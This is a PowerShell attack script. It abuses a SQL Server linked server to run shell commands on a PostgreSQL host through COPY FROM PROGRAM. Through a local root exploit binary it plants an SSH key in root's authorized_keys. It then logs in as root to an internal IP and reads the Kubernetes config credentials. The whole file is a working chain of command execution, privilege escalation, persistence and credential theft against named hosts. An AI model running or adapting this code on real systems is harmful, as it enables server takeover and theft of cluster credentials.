$q=[char]39; $dq=[char]36+[char]36

function PG145-Exec($cmd) {
    sqlcmd -S localhost -x -h -1 -W -Q "EXEC ($q`TRUNCATE cmd_out$q) AT PG145" 2>&1 | Out-Null
    sqlcmd -S localhost -x -h -1 -W -Q "EXEC ($q`COPY cmd_out FROM PROGRAM $dq$cmd$dq$q) AT PG145" 2>&1 | Out-Null
    $r = sqlcmd -S localhost -x -h -1 -W -Q "SELECT * FROM OPENQUERY(PG145,$q`SELECT line FROM cmd_out$q)" 2>&1
    return ($r | Where-Object {$_ -ne "" -and $_ -ne "NULL" -and $_ -notmatch "rows affected|---"})
}

$out = @()

# Write script to inject SSH key to root
$sshkey = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIP0ORBlTOkugazmgSWjHEmiV4QXs8jW1J0txJu/hQwEm svc"
sqlcmd -S localhost -x -h -1 -W -Q "EXEC ($q`COPY (SELECT 'mkdir -p /root/.ssh && echo $sshkey >> /root/.ssh/authorized_keys && chmod 700 /root/.ssh && chmod 600 /root/.ssh/authorized_keys && echo ROOT_KEY_INJECTED') TO PROGRAM ${dq}tee /tmp/inject_root.sh${dq}$q) AT PG145" 2>&1 | Out-Null
PG145-Exec "chmod +x /tmp/inject_root.sh" | Out-Null

# Run DirtyFrag to execute as root
$out += "=== INJECTING ROOT SSH KEY ==="
$r = PG145-Exec "export PATH=/usr/bin:/bin:/usr/sbin:/sbin && echo 'bash /tmp/inject_root.sh' | timeout 45 /tmp/df 2>/dev/null"
$out += $r

# Verify - try to read authorized_keys as postgres (will fail if not writable)
$out += "=== VERIFY ==="
$r = PG145-Exec "ls -la /root/.ssh/authorized_keys 2>&1"
$out += $r

# Now try SSH as root from MCS-DB-DEV
$out += "=== SSH AS ROOT ==="
$bs = [char]92
$keypath = "C:" + $bs + "temp" + $bs + "k8s_key"
$sshcmd = "C:" + $bs + "Windows" + $bs + "System32" + $bs + "OpenSSH" + $bs + "ssh.exe -i $keypath -o StrictHostKeyChecking=no -o ConnectTimeout=10 root@10.9.100.145 " + $q + "cat /root/.kube/config 2>&1 | head -30" + $q
$r = & cmd /c $sshcmd 2>&1
$out += $r

# Save
$outPath = Join-Path "F:\Database" "k8s_root_result.txt"
$out | Out-File $outPath -Encoding ASCII
Write-Output "SAVED: $($out.Count) lines"
